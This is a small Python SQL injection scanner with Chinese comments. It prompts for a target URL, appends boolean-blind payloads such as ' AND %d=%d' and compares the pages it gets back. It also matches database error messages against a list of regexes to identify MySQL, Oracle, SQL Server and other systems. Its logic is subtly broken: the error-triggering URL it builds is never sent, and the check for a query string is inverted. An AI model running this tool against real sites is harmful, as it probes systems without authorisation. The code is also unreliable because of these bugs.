import random
import re

from crawl import HtmlCrawl

downloader = HtmlCrawl()

BOOLEAN_TESTS = (" AND %d=%d", " OR NOT (%d=%d)")
DBMS_ERRORS = {  # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (
        r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
               r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}


class Spider:
    def run(self, url, html):
        # 先探测数据库
        if (not url.find("?")):
            return False
        _url = url + "%29%28%22%27"  # 先用)("'使报错
        try:
            _content = html
            for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                if (re.search(regex, _content)):
                    return True
            content = {}
            content["origin"] = downloader.request(url)
            for test_payload in BOOLEAN_TESTS:
                # 正确的网页
                RANDINT = random.randint(1, 255)
                _url = url + test_payload % (RANDINT, RANDINT)
                content["true"] = downloader.request(_url)
                _url = url + test_payload % (RANDINT, RANDINT + 1)
                content["false"] = downloader.request(_url)
                if content["origin"] == content["true"] != content["false"]:
                    return "SQL may exist: %s" % url
        except Exception as e:
            print(e)
        return "SQL may not exist: %s" % url


if __name__ == "__main__":
    html = ""
    url = input("请输入目标URL：")
    a = Spider()
    c = a.run(url,html)
